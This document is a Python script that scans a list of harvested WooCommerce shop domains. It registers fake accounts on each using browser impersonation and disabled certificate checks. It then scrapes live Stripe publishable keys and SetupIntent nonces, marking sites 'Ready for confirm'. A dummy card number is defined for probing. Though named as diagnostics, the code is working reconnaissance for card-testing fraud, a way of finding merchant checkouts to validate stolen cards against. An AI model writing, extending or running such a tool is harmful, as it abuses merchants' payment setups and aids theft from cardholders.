import asyncio
import json
import os
import re
import random
import string
from curl_cffi.requests import AsyncSession

PROBE_DUMMY_CARD = {"number": "5175465382242090", "mm": "09", "yy": "2030", "cvc": "018"}

def rand_str(k=8):
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=k))

async def diagnose_domain(domain: str):
    base = f"https://{domain}"
    reg_url = f"{base}/my-account/"
    diag = {"domain": domain, "step": "init", "reason": ""}
    
    try:
        async with AsyncSession(impersonate="chrome131", verify=False) as s:
            # 1. GET
            r_get = await s.get(reg_url, timeout=10)
            if r_get.status_code != 200:
                diag["step"] = "GET /my-account/"
                diag["reason"] = f"HTTP {r_get.status_code}"
                return diag
            html = r_get.text
            
            nonce_m = re.search(r'woocommerce-register-nonce["\']?\s*value=["\']([a-f0-9]{10})["\']', html)
            if not nonce_m:
                diag["step"] = "GET /my-account/"
                diag["reason"] = "No register nonce in HTML"
                return diag
            reg_nonce = nonce_m.group(1)
            
            # 2. POST registration
            uname = f"usr_{rand_str(8)}"
            email = f"alex.{rand_str(8)}@gmail.com"
            pwd = f"Sec_{rand_str(8)}!9aA"
            body = {
                "email": email,
                "password": pwd,
                "woocommerce-register-nonce": reg_nonce,
                "_wp_http_referer": "/my-account/",
                "register": "Register"
            }
            if 'name="username"' in html:
                body["username"] = uname
                
            reg_form = re.search(r'<form[^>]*class="[^"]*register[^"]*"[^>]*>(.*?)</form>', html, re.S)
            if reg_form:
                hidden_inputs = re.findall(r'<input[^>]*type=["\']hidden["\'][^>]*>', reg_form.group(1))
                for inp in hidden_inputs:
                    nm = re.search(r'name=["\']([^"\']+)["\']', inp)
                    vl = re.search(r'value=["\']([^"\']*)["\']', inp)
                    if nm and vl and nm.group(1) not in body:
                        body[nm.group(1)] = vl.group(1)
                        
            headers = {"Origin": base, "Referer": reg_url}
            r_post = await s.post(reg_url, data=body, headers=headers, timeout=12)
            cookies = s.cookies.get_dict()
            if not any("wordpress_logged_in" in k for k in cookies):
                # Inspect response for error notices
                errs = re.findall(r'<ul class="[^"]*woocommerce-error[^"]*"[^>]*>(.*?)</ul>', r_post.text, re.S)
                diag["step"] = "POST /my-account/ (Register)"
                diag["reason"] = f"No login cookie (Errors: {errs[0].strip()[:80] if errs else 'None shown / Honeypot or bot challenge'})"
                return diag
                
            # 3. GET add-payment-method
            add_pm_url = f"{base}/my-account/add-payment-method/"
            r_pm = await s.get(add_pm_url, timeout=10)
            pm_html = r_pm.text
            
            if "pk_test_" in pm_html and "pk_live_" not in pm_html:
                diag["step"] = "GET /add-payment-method/"
                diag["reason"] = "Test mode only (pk_test_)"
                return diag
                
            pk_m = re.findall(r'pk_live_[0-9a-zA-Z]{24,}', pm_html)
            pk = pk_m[0] if pk_m else ""
            
            upe_m = re.search(r'createAndConfirmSetupIntentNonce["\']?\s*[:=]\s*["\']([^"\']+)["\']', pm_html)
            upe_nonce = upe_m.group(1) if upe_m else ""
            legacy_m = re.search(r'add_card_nonce["\']?\s*[:=]\s*["\']([a-f0-9]{10})["\']', pm_html)
            legacy_nonce = legacy_m.group(1) if legacy_m else ""
            
            if not pk:
                diag["step"] = "GET /add-payment-method/"
                diag["reason"] = "No pk_live found (saved_cards disabled or non-Stripe)"
                return diag
            if not upe_nonce and not legacy_nonce:
                diag["step"] = "GET /add-payment-method/"
                diag["reason"] = f"pk_live found ({pk[:16]}...) but no SetupIntent nonces"
                return diag
                
            diag["step"] = "Stage 4 (Confirm)"
            diag["reason"] = f"Ready for confirm | PK={pk[:16]}... UPE={bool(upe_nonce)}"
            return diag
    except Exception as e:
        diag["step"] = "Network/Exception"
        diag["reason"] = str(e)[:100]
        return diag

async def main():
    # Run diagnosis on the 18 candidate domains
    # Load candidate domains from harvested_domains.txt
    with open("data/harvested_domains.txt", encoding="utf-8") as f:
        domains = [l.strip() for l in f if l.strip()]
        
    sem = asyncio.Semaphore(20)
    async def bound_diag(d):
        async with sem:
            return await diagnose_domain(d)
            
    # Sample 40 domains
    results = await asyncio.gather(*[bound_diag(d) for d in domains[:40]])
    print(json.dumps(results[:15], indent=2))

if __name__ == "__main__":
    asyncio.run(main())
